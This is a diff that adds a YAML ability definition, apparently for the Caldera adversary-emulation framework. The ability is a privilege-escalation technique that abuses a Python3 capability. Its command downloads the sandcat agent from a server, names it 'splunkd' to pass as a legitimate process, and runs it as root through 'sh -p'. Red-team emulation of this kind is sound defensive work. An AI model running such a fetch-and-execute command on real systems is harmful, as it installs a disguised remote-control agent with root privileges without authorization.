@@ -1,0 +1,24 @@
+- name: 'Abuse Linux Capability: Python3'
+  description: Use python3 to pull down Caldera agent as root
+  tactic: privilege-escalation
+  technique_id: T1548
+  technique_name: Abuse Elevation Control Mechanism
+  executors:
+  - payloads: []
+    platform: linux
+    name: sh
+    cleanup: []
+    parsers: []
+    command: python3 -c "import os; server='#{server}'; curl_cmd=f'curl -s -X POST
+      -H \"file:sandcat.go\" -H \"platform:linux\" {server}/file/download > splunkd';
+      chmod_cmd='chmod +x splunkd'; os.system(curl_cmd); os.system(chmod_cmd); os.execl('/bin/sh',
+      'sh', '-p', '-c', f'./splunkd -server {server} -group red')"
+  repeatable: false
+  additional_info: {}
+  privilege: ''
+  singleton: true
+  buckets: []
+  requirements: []
+  access: {}
+  cleanup: []
+  id: 7f6ea111-1528-4bf7-9ae1-3ee9c3eb3218
